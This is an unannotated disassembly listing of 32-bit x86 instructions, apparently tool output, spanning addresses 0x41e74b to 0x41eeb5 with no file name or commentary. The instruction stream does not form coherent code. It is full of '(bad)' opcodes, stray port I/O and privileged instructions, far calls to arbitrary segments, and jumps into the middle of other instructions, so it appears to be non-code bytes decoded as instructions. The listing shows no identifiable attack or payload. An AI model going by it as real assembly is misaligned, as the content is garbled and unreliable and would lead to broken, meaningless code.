  41e74b:	mov    ebp,0xb0477aaf
  41e750:	add    ebx,esp
  41e752:	ret    0x381c
  41e755:	ss (bad) 
  41e757:	shr    bl,1
  41e759:	cmp    BYTE PTR [edi],al
  41e75b:	nop
  41e75c:	cmp    ebp,DWORD PTR [edx]
  41e75e:	mov    esi,0xc4797e8d
  41e763:	mov    dl,0x54
  41e765:	and    eax,0x69bd044b
  41e76a:	inc    edi
  41e76b:	(bad)  
  41e76c:	repz jle 0x41e798
  41e76f:	mov    ah,BYTE PTR [ebx-0x78]
  41e772:	dec    eax
  41e773:	lock lea edi,[esi+edx*8-0x5ea32d8c]
  41e77b:	out    0x14,eax
  41e77d:	loope  0x41e700
  41e77f:	pusha  
  41e780:	jne    0x41e7a2
  41e782:	loope  0x41e7e1
  41e784:	jmp    0x41e7f0
  41e786:	sub    edx,esi
  41e788:	ret    0xa124
  41e78b:	idiv   DWORD PTR [ecx+0x56b131e1]
  41e791:	pop    eax
  41e792:	cmc    
  41e793:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e796:	fild   WORD PTR [esp+eax*2]
  41e799:	test   DWORD PTR [edx],esi
  41e79b:	mov    bl,0x67
  41e79d:	mov    bl,0xee
  41e79f:	mov    ds:0x9f079292,al
  41e7a4:	adc    BYTE PTR [edx],ah
  41e7a6:	aam    0xe8
  41e7a8:	cwde   
  41e7a9:	sti    
  41e7aa:	(bad)  
  41e7ab:	pop    edi
  41e7ac:	and    al,0x4e
  41e7ae:	out    dx,al
  41e7af:	adc    dl,BYTE PTR [ebp+0x63]
  41e7b2:	pop    esi
  41e7b3:	mov    ecx,0xbc122e6a
  41e7b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7b9:	fild   DWORD PTR [eax]
  41e7bb:	stos   BYTE PTR es:[edi],al
  41e7bc:	sub    BYTE PTR [edi],0x5b
  41e7bf:	in     eax,dx
  41e7c0:	rcr    DWORD PTR [eax+0x20dcbaeb],1
  41e7c6:	jge    0x41e788
  41e7c8:	cwde   
  41e7c9:	test   DWORD PTR [ecx-0xdcd42d0],0xbd1d8df4
  41e7d3:	das    
  41e7d4:	xchg   DWORD PTR [ebx+ebx*4+0x12965e4e],ebp
  41e7db:	sub    eax,0x25995143
  41e7e0:	call   0x5b02:0xf075fe0a
  41e7e7:	into   
  41e7e8:	push   esp
  41e7e9:	out    dx,al
  41e7ea:	add    eax,0x22c1d938
  41e7ef:	and    bh,BYTE PTR [ebp+0x56ec4202]
  41e7f5:	inc    edi
  41e7f6:	loop   0x41e7be
  41e7f8:	sub    WORD PTR [eax+0x37],dx
  41e7fc:	js     0x41e85b
  41e7fe:	mov    ebp,0xef2eed07
  41e803:	out    dx,eax
  41e804:	std    
  41e805:	cmp    al,0x3e
  41e807:	mov    ah,0xaf
  41e809:	pop    es
  41e80a:	adc    ebx,DWORD PTR [edi-0x77]
  41e80d:	in     eax,dx
  41e80e:	test   DWORD PTR [edi],ebp
  41e810:	fstp   st(2)
  41e812:	(bad)  
  41e813:	fsubr  QWORD PTR [ebx]
  41e815:	into   
  41e816:	repnz lahf 
  41e818:	nop
  41e819:	sub    eax,DWORD PTR [ecx+0x36c54940]
  41e81f:	mov    ebx,0x3b13b6aa
  41e824:	push   ebp
  41e825:	popa   
  41e826:	pop    eax
  41e827:	test   DWORD PTR [ebp+0x74],esi
  41e82a:	sbb    BYTE PTR [ecx],dh
  41e82c:	(bad)  
  41e82e:	xor    bl,bh
  41e830:	mov    dl,BYTE PTR [ebx+0x3c61e1]
  41e836:	pop    eax
  41e837:	xchg   ebx,eax
  41e838:	add    cl,BYTE PTR [eax]
  41e83a:	cld    
  41e83b:	rcr    DWORD PTR [edx],cl
  41e83d:	dec    eax
  41e83e:	(bad)  
  41e83f:	icebp  
  41e840:	movlps xmm3,QWORD PTR [edx+0x6c]
  41e844:	and    edx,DWORD PTR [edi-0x2242c2da]
  41e84a:	bound  edx,QWORD PTR [esp+ebx*8]
  41e84d:	clc    
  41e84e:	push   cs
  41e84f:	mov    ds:0xbf2472ba,eax
  41e854:	push   ds
  41e855:	stos   BYTE PTR es:[edi],al
  41e856:	jne    0x41e7da
  41e858:	ldmxcsr DWORD PTR [edx-0x26]
  41e85c:	mov    edx,0x8b2d9283
  41e861:	icebp  
  41e862:	aad    0xed
  41e864:	mov    esi,0x8ee89926
  41e869:	inc    ecx
  41e86a:	lock mov al,ds:0x5c78d57b
  41e870:	rcr    DWORD PTR [edx],1
  41e872:	pop    edi
  41e873:	and    DWORD PTR [ebp+edx*1+0xa],0xe2e2ae50
  41e87b:	jle    0x41e8c5
  41e87d:	mov    edi,0xe93cb72c
  41e882:	xchg   edi,eax
  41e883:	push   0x62
  41e885:	inc    esp
  41e886:	jl     0x41e8ed
  41e888:	cmc    
  41e889:	jl     0x41e85c
  41e88b:	inc    eax
  41e88c:	fdivr  st,st(4)
  41e88e:	shr    al,1
  41e890:	xor    DWORD PTR [ebp-0x30],edx
  41e893:	jecxz  0x41e84f
  41e895:	inc    ebx
  41e896:	xchg   DWORD PTR [bx-0x3603],esi
  41e89b:	loop   0x41e83e
  41e89d:	xchg   esi,eax
  41e89e:	or     DWORD PTR [eax],ebx
  41e8a0:	sahf   
  41e8a1:	or     BYTE PTR [edi],bh
  41e8a3:	sub    bl,BYTE PTR [esi]
  41e8a5:	sar    DWORD PTR [eax+0x2b],0x45
  41e8a9:	fisubr WORD PTR [eax+0x37190da2]
  41e8af:	add    BYTE PTR [ebp-0x1c],al
  41e8b2:	dec    ebx
  41e8b3:	fcomp  QWORD PTR [esi+0x32]
  41e8b6:	push   ebp
  41e8b7:	xor    eax,0xdb9dc2fe
  41e8bc:	in     al,0x55
  41e8be:	push   cs
  41e8bf:	enter  0x3aeb,0x8d
  41e8c3:	and    DWORD PTR [bp-0x2b],esi
  41e8c7:	sub    ah,bh
  41e8c9:	fst    DWORD PTR [ecx]
  41e8cb:	inc    ebp
  41e8cc:	rcr    DWORD PTR [edi],cl
  41e8ce:	lods   eax,DWORD PTR ds:[esi]
  41e8cf:	jmp    0x41e93a
  41e8d1:	sub    edi,edx
  41e8d3:	les    edx,FWORD PTR [esi-0x28fefc9b]
  41e8d9:	mov    al,0x65
  41e8db:	mov    dl,0x71
  41e8dd:	cmp    cl,bh
  41e8df:	call   0xe01f:0xb1c977eb
  41e8e6:	out    0x34,eax
  41e8e8:	mov    eax,0x1842505d
  41e8ed:	xchg   edi,eax
  41e8ee:	icebp  
  41e8ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8f0:	and    DWORD PTR [ebx-0x72269a],edi
  41e8f6:	cld    
  41e8f7:	call   0x54d80ac9
  41e8fc:	in     al,dx
  41e8fd:	stos   DWORD PTR es:[edi],eax
  41e8fe:	in     al,dx
  41e8ff:	lock ret 0xf04d
  41e903:	push   edx
  41e904:	js     0x41e96b
  41e906:	test   DWORD PTR [edx+0x597d852a],ecx
  41e90c:	or     al,0xcc
  41e90e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e90f:	(bad)  
  41e911:	jecxz  0x41e94f
  41e913:	push   cs
  41e914:	mov    al,0xf
  41e916:	inc    edi
  41e917:	mov    ch,0xc3
  41e919:	mov    dl,0x4d
  41e91b:	ret    
  41e91c:	mov    dh,0xe9
  41e91e:	push   es
  41e91f:	mov    edi,0x5b3b33cb
  41e924:	cmp    eax,0xeecb2efe
  41e929:	mov    dl,BYTE PTR [ebp-0x6]
  41e92c:	pushf  
  41e92d:	mov    ecx,0x234c64ff
  41e932:	shr    bh,0x32
  41e935:	pop    edx
  41e936:	int    0x32
  41e938:	xchg   edx,eax
  41e939:	sbb    BYTE PTR [eax-0x26ee57f8],al
  41e93f:	pop    esi
  41e940:	or     eax,DWORD PTR [eax-0x9804d0]
  41e946:	aas    
  41e947:	adc    edi,DWORD PTR [edi+0x62]
  41e94a:	and    DWORD PTR [ecx],esi
  41e94c:	loop   0x41e8f2
  41e94e:	add    edi,DWORD PTR [ecx+0x61]
  41e951:	xchg   esp,eax
  41e952:	pop    ds
  41e953:	add    DWORD PTR [ecx],eax
  41e955:	inc    edx
  41e956:	jmp    0x41e98a
  41e958:	rcl    DWORD PTR [ecx+eiz*1],cl
  41e95b:	xchg   ebp,ebx
  41e95d:	loope  0x41e9ac
  41e95f:	mov    cl,0xc7
  41e961:	outs   dx,BYTE PTR ds:[esi]
  41e962:	and    edx,DWORD PTR [esi]
  41e964:	ret    
  41e965:	push   esp
  41e966:	and    BYTE PTR [edi-0x419255e8],ah
  41e96c:	sbb    al,BYTE PTR [ecx]
  41e96e:	push   ebp
  41e96f:	push   esp
  41e970:	jnp    0x41e954
  41e972:	push   eax
  41e973:	lahf   
  41e974:	rcl    BYTE PTR [ebx],0x7c
  41e977:	sbb    eax,DWORD PTR [edi+0x5be89c2a]
  41e97d:	inc    esp
  41e97e:	(bad)  
  41e97f:	mov    cl,0x7c
  41e981:	icebp  
  41e982:	pop    ecx
  41e983:	jo     0x41e91b
  41e985:	xchg   edx,eax
  41e986:	adc    eax,0x35341895
  41e98b:	loopne 0x41e949
  41e98d:	pusha  
  41e98e:	imul   esi,DWORD PTR [eax-0x266c1900],0x50
  41e995:	xchg   ecx,eax
  41e996:	xor    DWORD PTR [ebx+eax*2+0x52],esi
  41e99a:	fdivr  QWORD PTR [edx-0x2a1c6b5a]
  41e9a0:	pusha  
  41e9a1:	sub    DWORD PTR [ebx+0xb241099],eax
  41e9a7:	inc    ebp
  41e9a8:	(bad)  
  41e9a9:	std    
  41e9aa:	(bad)  
  41e9ab:	xchg   esp,eax
  41e9ac:	sbb    DWORD PTR [edx+0x7a4506fc],ecx
  41e9b2:	fwait
  41e9b3:	shl    DWORD PTR [ecx-0x66],1
  41e9b6:	pop    ecx
  41e9b7:	dec    edx
  41e9b8:	mov    DWORD PTR [edx+0x69],eax
  41e9bb:	shl    DWORD PTR [eax+0x6fdefc45],cl
  41e9c1:	cmp    al,BYTE PTR [edx-0x52]
  41e9c4:	or     dh,al
  41e9c6:	test   eax,0xc1f96ce1
  41e9cb:	mov    al,0xd9
  41e9cd:	cdq    
  41e9ce:	or     cl,BYTE PTR [ecx]
  41e9d0:	mov    ss,WORD PTR [edx+ebx*1]
  41e9d3:	cmp    bh,BYTE PTR [eax-0x668ed298]
  41e9d9:	sti    
  41e9da:	push   esi
  41e9db:	nop
  41e9dc:	xor    bl,ch
  41e9de:	pop    ss
  41e9df:	push   ebx
  41e9e0:	retf   
  41e9e1:	out    dx,eax
  41e9e2:	fwait
  41e9e3:	mov    edi,0x2cfe1b9d
  41e9e8:	cmp    edx,DWORD PTR [ecx+ebp*1+0x36f26dff]
  41e9ef:	fs inc ebp
  41e9f1:	xor    al,bh
  41e9f3:	mov    esp,0x2f587408
  41e9f8:	sbb    al,0xeb
  41e9fa:	sub    DWORD PTR [edi*1+0x7557ccd4],esi
  41ea01:	jne    0x41e9b6
  41ea03:	inc    edx
  41ea04:	imul   esp,eax,0x1a0dbd4c
  41ea0a:	xor    esp,DWORD PTR [ebp-0x7e6e2fcc]
  41ea10:	adc    bh,dh
  41ea12:	addr16 into 
  41ea14:	add    BYTE PTR cs:[ecx-0x2abaf397],dl
  41ea1b:	cli    
  41ea1c:	ret    
  41ea1d:	int3   
  41ea1e:	mov    dh,0xcf
  41ea20:	aaa    
  41ea21:	mov    esp,edi
  41ea23:	cdq    
  41ea24:	and    BYTE PTR [ecx+0x54edec72],0x12
  41ea2b:	mov    edi,0x12ac55b
  41ea30:	xor    ch,bh
  41ea32:	and    bh,ah
  41ea34:	cmp    eax,0x2ae67b8c
  41ea39:	loopne 0x41ea59
  41ea3b:	inc    esi
  41ea3c:	shl    BYTE PTR [ebp-0xc],0x27
  41ea40:	jnp    0x41e9ff
  41ea42:	adc    eax,0x3cc2b23d
  41ea47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea49:	call   DWORD PTR [edi]
  41ea4b:	aaa    
  41ea4c:	dec    ebp
  41ea4d:	enter  0x1146,0x95
  41ea51:	sbb    eax,0x2916215a
  41ea56:	jge    0x41ea4a
  41ea58:	lea    eax,[ecx]
  41ea5a:	push   edx
  41ea5b:	push   edi
  41ea5c:	repz neg DWORD PTR [eax+0x485db2bc]
  41ea63:	in     al,dx
  41ea64:	sar    DWORD PTR [ebp+0x149501f3],1
  41ea6a:	iret   
  41ea6b:	pop    eax
  41ea6c:	pushf  
  41ea6d:	fsub   QWORD PTR [esi-0x71]
  41ea70:	xor    BYTE PTR [ecx],dh
  41ea72:	out    0x51,al
  41ea74:	retf   
  41ea75:	cli    
  41ea76:	(bad)  
  41ea78:	out    dx,eax
  41ea79:	pop    es
  41ea7a:	and    eax,0xb39cf7b8
  41ea7f:	mov    al,0xd1
  41ea81:	cmp    al,0xfd
  41ea83:	pushf  
  41ea84:	addr16 int3 
  41ea86:	loop   0x41ea88
  41ea88:	scas   eax,DWORD PTR es:[edi]
  41ea89:	jmp    0x41ead4
  41ea8b:	pop    ds
  41ea8c:	xchg   edi,eax
  41ea8d:	pop    ebx
  41ea8e:	mov    bh,0xb9
  41ea90:	and    ah,BYTE PTR [ebp+ebx*1-0x5a9fdd85]
  41ea97:	xor    DWORD PTR [ebp+edx*2+0x5f],ebp
  41ea9b:	and    al,0xfe
  41ea9d:	(bad)  
  41ea9e:	mov    eax,0x7d387fee
  41eaa3:	sbb    DWORD PTR [esi+0x2776ac85],0xffffff88
  41eaaa:	int3   
  41eaab:	scas   al,BYTE PTR es:[edi]
  41eaac:	rol    edi,1
  41eaae:	in     al,0x4f
  41eab0:	loopne 0x41ea4e
  41eab2:	sbb    eax,0x53
  41eab5:	push   esi
  41eab6:	pop    edi
  41eab7:	xor    BYTE PTR [edx-0x3d],bh
  41eaba:	outs   dx,DWORD PTR es:[esi]
  41eabc:	inc    ebx
  41eabd:	aaa    
  41eabe:	mov    esp,0xc6d76fce
  41eac3:	(bad)  
  41eac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eac5:	fneni(8087 only) 
  41eac7:	iret   
  41eac8:	enter  0xc1a,0x8
  41eacc:	jle    0x41eadb
  41eace:	xlat   BYTE PTR ds:[ebx]
  41eacf:	push   cs
  41ead0:	and    ah,BYTE PTR [esi]
  41ead2:	dec    edx
  41ead3:	push   ebx
  41ead4:	fldenv [ebx+0x5702796a]
  41eada:	push   es
  41eadb:	inc    edi
  41eadc:	sahf   
  41eadd:	pusha  
  41eade:	mov    gs,WORD PTR [esi]
  41eae0:	push   0xa14ff8cd
  41eae5:	repz mov bl,0x56
  41eae8:	(bad)  
  41eae9:	int3   
  41eaea:	jmp    0x33146c12
  41eaef:	add    ah,dl
  41eaf1:	push   0xba7b3864
  41eaf6:	cmc    
  41eaf7:	xor    DWORD PTR [ebp+0x21082660],ebx
  41eafd:	stos   DWORD PTR es:[edi],eax
  41eafe:	into   
  41eaff:	cmp    bh,BYTE PTR [edx+edx*1-0x4ccacaa6]
  41eb06:	fisttp QWORD PTR [edi-0x46]
  41eb09:	fwait
  41eb0a:	pusha  
  41eb0b:	ficomp DWORD PTR [ecx]
  41eb0d:	dec    ecx
  41eb0e:	push   ebx
  41eb0f:	jg     0x41eb27
  41eb11:	sub    ch,BYTE PTR ds:0xf1c736e5
  41eb17:	cld    
  41eb18:	mov    bl,0x2b
  41eb1a:	outs   dx,BYTE PTR ds:[esi]
  41eb1b:	push   es
  41eb1c:	imul   esi,DWORD PTR [ecx],0xb630ae73
  41eb22:	ret    0xc790
  41eb25:	xor    eax,0xb16065dc
  41eb2a:	retf   
  41eb2b:	shr    DWORD PTR [edi-0xf],1
  41eb2e:	adc    eax,0xe099fc3f
  41eb33:	daa    
  41eb34:	mov    ecx,0x14a6b784
  41eb39:	mov    cl,BYTE PTR [edx-0x5e]
  41eb3c:	push   ds
  41eb3d:	add    eax,0xa0fed4e8
  41eb42:	pop    edi
  41eb43:	dec    eax
  41eb44:	mov    ebp,edx
  41eb46:	pop    ecx
  41eb47:	push   esi
  41eb48:	mov    ecx,0xe5b57bc5
  41eb4d:	ja     0x41eb77
  41eb4f:	fist   DWORD PTR [edi-0x6b152ed8]
  41eb55:	or     ah,BYTE PTR [edi-0x1b6999e2]
  41eb5b:	fisubr DWORD PTR [ebx+eiz*4]
  41eb5e:	jo     0x41eb65
  41eb60:	inc    esp
  41eb61:	scas   eax,DWORD PTR es:[edi]
  41eb62:	pop    esi
  41eb63:	dec    edx
  41eb64:	cmp    BYTE PTR [edx],cl
  41eb66:	test   eax,0x2f971227
  41eb6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb6c:	inc    esp
  41eb6d:	in     eax,0x2f
  41eb6f:	cmc    
  41eb70:	sbb    ebx,DWORD PTR [ebp+0x65]
  41eb73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb74:	xlat   BYTE PTR ds:[ebx]
  41eb75:	out    dx,eax
  41eb76:	push   edx
  41eb77:	push   ss
  41eb78:	cmp    BYTE PTR [esi+0x22a02025],0x49
  41eb7f:	add    al,0xb6
  41eb81:	xchg   ebx,eax
  41eb82:	cdq    
  41eb83:	sar    BYTE PTR [edx+0x5e73934b],1
  41eb89:	sti    
  41eb8a:	daa    
  41eb8b:	jg     0x41ebf5
  41eb8d:	push   edi
  41eb8e:	sub    BYTE PTR [ebx+0x7760820],cl
  41eb94:	push   es
  41eb95:	lahf   
  41eb96:	dec    eax
  41eb97:	xchg   esi,eax
  41eb98:	sub    eax,0x55077721
  41eb9d:	pop    edi
  41eb9e:	add    BYTE PTR [ecx+ebx*4+0x1c69662d],0xf2
  41eba6:	stos   DWORD PTR es:[di],eax
  41eba8:	sub    dh,bh
  41ebaa:	xor    al,0x2a
  41ebac:	ret    0x1a84
  41ebaf:	data16 (bad) 
  41ebb1:	test   BYTE PTR [eiz*1+0x2bcad2],0xd
  41ebb9:	aas    
  41ebba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebbb:	mov    ebx,esi
  41ebbd:	test   DWORD PTR [eax+0x380b61c5],0x9de12f40
  41ebc7:	(bad)  
  41ebc8:	fcomp  QWORD PTR [edx-0x6d7d70f9]
  41ebce:	mov    dl,0xa7
  41ebd0:	xchg   esi,eax
  41ebd1:	(bad)  
  41ebd2:	fs xor al,0xf6
  41ebd5:	push   ecx
  41ebd6:	pop    edx
  41ebd7:	mov    DWORD PTR ds:0xe26f653c,eax
  41ebdd:	pop    edx
  41ebde:	stos   DWORD PTR es:[edi],eax
  41ebdf:	mov    ebx,0xbbddeb84
  41ebe4:	xchg   edi,eax
  41ebe5:	push   esi
  41ebe6:	mov    edi,DWORD PTR [edx]
  41ebe8:	mov    eax,ds:0xcd743547
  41ebed:	push   cs
  41ebee:	and    ebx,DWORD PTR [edi+0xeb454d6]
  41ebf4:	xchg   ecx,eax
  41ebf5:	jg     0x41ebb1
  41ebf7:	fld    DWORD PTR [esi-0x43ce4ed6]
  41ebfd:	gs sahf 
  41ebff:	push   0x38
  41ec01:	aam    0x63
  41ec03:	jb     0x41ec09
  41ec05:	xchg   ecx,eax
  41ec06:	and    BYTE PTR [eax-0xe],cl
  41ec09:	mov    bl,0x3
  41ec0b:	inc    esi
  41ec0c:	and    BYTE PTR ds:0xd91ee264,0x5a
  41ec13:	daa    
  41ec14:	xchg   esp,eax
  41ec15:	pop    edx
  41ec16:	loope  0x41eba1
  41ec18:	test   BYTE PTR [edi-0x2f415ce1],ch
  41ec1e:	push   cs
  41ec1f:	daa    
  41ec20:	inc    ebp
  41ec21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec22:	paddq  mm1,QWORD PTR [ebp*2+0x2b334966]
  41ec2a:	cmp    ebx,DWORD PTR [ebp-0x14]
  41ec2d:	cmp    al,0x71
  41ec2f:	idiv   DWORD PTR [esi-0x3e9ac325]
  41ec35:	shr    DWORD PTR [ebx-0xacb2bd0],0x60
  41ec3c:	repnz or al,bh
  41ec3f:	and    DWORD PTR [ebx+0x40],esp
  41ec42:	nop
  41ec43:	jno    0x41ebf7
  41ec45:	xchg   edi,eax
  41ec46:	aad    0xd6
  41ec48:	test   al,bl
  41ec4a:	pop    edi
  41ec4b:	sbb    eax,DWORD PTR ds:0xfe5008a8
  41ec51:	fyl2x  
  41ec53:	cld    
  41ec54:	adc    edi,DWORD PTR [ecx+eiz*1-0x4bff0038]
  41ec5b:	inc    ecx
  41ec5c:	aam    0xa
  41ec5e:	cmp    DWORD PTR [edx-0x76632f5],ebx
  41ec64:	and    eax,0xc0fd57e7
  41ec69:	cmp    dh,BYTE PTR [ebp+0x5d]
  41ec6c:	sub    BYTE PTR [ecx+0x3ec70874],bh
  41ec72:	push   esp
  41ec73:	das    
  41ec74:	test   al,0xa1
  41ec76:	inc    edi
  41ec77:	push   esp
  41ec78:	dec    ecx
  41ec79:	and    BYTE PTR [esi+ebx*1-0x20e286b6],0x67
  41ec81:	(bad)  
  41ec82:	retf   0x30a2
  41ec85:	clc    
  41ec86:	imul   esp,DWORD PTR [ebp-0xa16bc72],0xffffffb8
  41ec8d:	call   0xea1e215c
  41ec92:	sub    al,0x10
  41ec94:	adc    ah,BYTE PTR [edx+0x6bbc900a]
  41ec9a:	mov    ds:0x14aa9eae,eax
  41ec9f:	add    esp,DWORD PTR [esi]
  41eca1:	idiv   BYTE PTR ds:0xa3a443c9
  41eca7:	adc    eax,0x846d0a5e
  41ecac:	mov    bl,0x9
  41ecae:	shr    BYTE PTR [edi+0x6e5c1a7e],0x35
  41ecb5:	mov    eax,ds:0xac512d76
  41ecba:	xor    DWORD PTR [edi+0x7a0db168],esi
  41ecc0:	lea    eax,[ebx+0x67]
  41ecc3:	popf   
  41ecc4:	inc    edi
  41ecc5:	sub    ch,dl
  41ecc7:	or     dh,BYTE PTR [edi-0x23f7152]
  41eccd:	or     eax,edi
  41eccf:	mov    ds:0x68d2c053,al
  41ecd4:	adc    ecx,DWORD PTR [edx]
  41ecd6:	sub    esi,DWORD PTR [edi-0x7d]
  41ecd9:	or     eax,0xaac48914
  41ecde:	jl     0x41ed41
  41ece0:	lods   eax,DWORD PTR ds:[esi]
  41ece1:	not    BYTE PTR [ebp-0x3487f200]
  41ece7:	and    DWORD PTR [ecx],0x3dbfb1fd
  41eced:	std    
  41ecee:	outs   dx,BYTE PTR ds:[esi]
  41ecef:	mov    ch,0x72
  41ecf1:	inc    edx
  41ecf2:	push   0xffffffde
  41ecf4:	mov    esp,DWORD PTR [esi]
  41ecf6:	fnsave ds:0x1ef98827
  41ecfc:	inc    eax
  41ecfd:	(bad)  
  41ecfe:	fst    DWORD PTR [eax+0x2fb2eab3]
  41ed04:	adc    DWORD PTR [edx+0x74b02604],ecx
  41ed0a:	cmp    BYTE PTR [esi-0x6f4c0561],ch
  41ed10:	inc    ecx
  41ed11:	sbb    ebx,DWORD PTR [ebp+0x7d]
  41ed14:	(bad)  
  41ed15:	jae    0x41ed07
  41ed17:	mov    dh,0x90
  41ed19:	mov    dh,0x8
  41ed1b:	stos   DWORD PTR es:[edi],eax
  41ed1c:	cmp    DWORD PTR [ebx-0x1],edx
  41ed1f:	aam    0xe4
  41ed21:	push   ss
  41ed22:	cmp    DWORD PTR [edi],ebx
  41ed24:	xchg   ebp,eax
  41ed25:	dec    ebp
  41ed26:	call   0xb37ed8cd
  41ed2b:	int    0xd6
  41ed2d:	js     0x41ed45
  41ed2f:	mov    ecx,0x4ab76903
  41ed34:	mov    bl,0x42
  41ed36:	stos   BYTE PTR es:[edi],al
  41ed37:	(bad)  [ecx+0x19]
  41ed3a:	in     al,dx
  41ed3b:	dec    ah
  41ed3d:	cmp    ch,BYTE PTR [ebx]
  41ed3f:	fmul   DWORD PTR [eax-0xd]
  41ed42:	test   esp,0xe9a50dee
  41ed48:	or     al,BYTE PTR [edx]
  41ed4a:	and    al,0x4d
  41ed4c:	shl    ch,1
  41ed4e:	es data16 jle 0x41ecdf
  41ed52:	(bad)  
  41ed53:	call   0xe9dccce8
  41ed58:	inc    edx
  41ed59:	cmp    edx,edi
  41ed5b:	scas   eax,DWORD PTR es:[edi]
  41ed5c:	sub    eax,0x9c84c630
  41ed61:	outs   dx,DWORD PTR ds:[esi]
  41ed62:	inc    esi
  41ed63:	les    edx,FWORD PTR [esi]
  41ed65:	ror    BYTE PTR [ebp+0x38ae74d],cl
  41ed6b:	sub    al,0xbf
  41ed6d:	jge    0x41ed6c
  41ed6f:	data16 cmp al,0x85
  41ed72:	mov    ebp,DWORD PTR [edx]
  41ed74:	jge    0x41ed97
  41ed76:	or     BYTE PTR [ebx],bl
  41ed78:	mov    BYTE PTR [esi-0x6f],bh
  41ed7b:	push   eax
  41ed7c:	dec    ebp
  41ed7d:	jge    0x41ede3
  41ed7f:	jmp    0x43dcdb8c
  41ed84:	push   esi
  41ed85:	inc    esp
  41ed86:	repnz mov fs,edi
  41ed89:	lods   eax,DWORD PTR ds:[esi]
  41ed8a:	stc    
  41ed8b:	and    eax,0x77132d4b
  41ed90:	daa    
  41ed91:	and    al,0x5d
  41ed93:	sub    edi,DWORD PTR [ecx-0x1d5c752b]
  41ed99:	loope  0x41ed95
  41ed9b:	cmp    BYTE PTR [esi],bh
  41ed9d:	fs push ds
  41ed9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eda0:	loope  0x41ed99
  41eda2:	xchg   ebx,eax
  41eda3:	mov    BYTE PTR [eax-0x29],al
  41eda6:	lock and DWORD PTR [edx],esp
  41eda9:	test   al,0x56
  41edab:	push   esp
  41edac:	mov    eax,ds:0x421f79e0
  41edb1:	stos   DWORD PTR es:[edi],eax
  41edb2:	sahf   
  41edb3:	inc    ebx
  41edb4:	ds stc 
  41edb6:	adc    al,0xd3
  41edb8:	xchg   ecx,eax
  41edb9:	xlat   BYTE PTR ds:[ebx]
  41edba:	dec    esi
  41edbb:	cmp    bl,BYTE PTR [eax+0x529c1735]
  41edc1:	sub    ebx,DWORD PTR [ebx]
  41edc3:	stc    
  41edc4:	and    dl,cl
  41edc6:	fild   WORD PTR [esi]
  41edc8:	add    al,BYTE PTR [edi-0x720dd84a]
  41edce:	jae    0x41edc8
  41edd0:	mov    ebp,0xdd74c05c
  41edd5:	pop    edi
  41edd6:	gs (bad) 
  41edd8:	push   ebx
  41edd9:	stos   DWORD PTR es:[edi],eax
  41edda:	ret    
  41eddb:	mov    esi,0xf3f1ebc0
  41ede0:	xor    dl,BYTE PTR [esi-0x216ef7f1]
  41ede6:	iret   
  41ede7:	daa    
  41ede8:	jb     0x41ee3f
  41edea:	out    0x28,eax
  41edec:	mov    al,ds:0x5f37041a
  41edf1:	mov    ecx,0xb0022eb8
  41edf6:	xchg   edi,eax
  41edf7:	test   bl,0xb
  41edfa:	sbb    ch,BYTE PTR [ebx]
  41edfc:	call   0x1a0e:0x6ff1ac1d
  41ee03:	cmp    BYTE PTR [ebp-0x7a0fa9ac],0x54
  41ee0a:	test   eax,0xd9b5eac9
  41ee0f:	and    DWORD PTR [edx+ebx*1+0x1c],0xdb6e8470
  41ee17:	idiv   BYTE PTR [edx-0x3d]
  41ee1a:	test   al,0x37
  41ee1c:	sahf   
  41ee1d:	or     eax,0xe900d3e7
  41ee22:	add    DWORD PTR [ebx+0x46],esi
  41ee25:	adc    al,0x9b
  41ee27:	xchg   DWORD PTR [edx-0x21],edx
  41ee2a:	pushf  
  41ee2b:	or     al,0x5b
  41ee2d:	aas    
  41ee2e:	fld    TBYTE PTR [ebx]
  41ee30:	or     al,0x45
  41ee32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee33:	into   
  41ee34:	call   0x87074418
  41ee39:	imul   ebp,DWORD PTR [edi+0x26],0xffffffc4
  41ee3d:	add    ecx,esi
  41ee3f:	loopne 0x41ee10
  41ee41:	lods   eax,DWORD PTR ds:[esi]
  41ee42:	mov    esp,0x77f231e7
  41ee47:	out    0x44,eax
  41ee49:	test   DWORD PTR [edx+0x236686af],ebx
  41ee4f:	mov    ecx,ecx
  41ee51:	ss mov al,0xae
  41ee54:	(bad)  
  41ee55:	fimul  DWORD PTR [ebp+0x57]
  41ee58:	call   0x2fea:0x9b624357
  41ee5f:	dec    ebp
  41ee60:	jne    0x41edea
  41ee62:	pop    eax
  41ee63:	xchg   bl,bl
  41ee65:	dec    ebx
  41ee66:	rdpmc  
  41ee68:	fsubr  st(1),st
  41ee6a:	fmul   QWORD PTR [edx]
  41ee6c:	push   edi
  41ee6d:	(bad)  [edi-0x27]
  41ee70:	test   eax,0xc08965b6
  41ee75:	stos   BYTE PTR es:[edi],al
  41ee76:	imul   esp,DWORD PTR [esp-0x3b],0xffffffbb
  41ee7b:	fbld   TBYTE PTR cs:[edx]
  41ee7e:	mov    esi,0xf63ca50c
  41ee83:	or     ebx,ecx
  41ee85:	xchg   DWORD PTR [ebx+0x3f20f835],ebx
  41ee8b:	lahf   
  41ee8c:	data16 std 
  41ee8e:	sub    esi,DWORD PTR [edi]
  41ee90:	inc    edx
  41ee91:	and    eax,0xdea1d57d
  41ee96:	xchg   edi,eax
  41ee97:	hlt    
  41ee98:	retf   
  41ee99:	je     0x41eec5
  41ee9b:	inc    ecx
  41ee9c:	or     BYTE PTR [eax-0x348123e5],ch
  41eea2:	fld    QWORD PTR [eax+0x3c]
  41eea5:	pop    eax
  41eea6:	inc    ecx
  41eea7:	inc    ebx
  41eea8:	xchg   ebx,eax
  41eea9:	mov    edx,0x6f155745
  41eeae:	cmp    al,0x10
  41eeb0:	and    eax,0x119ef77f
  41eeb5:	push   ebx
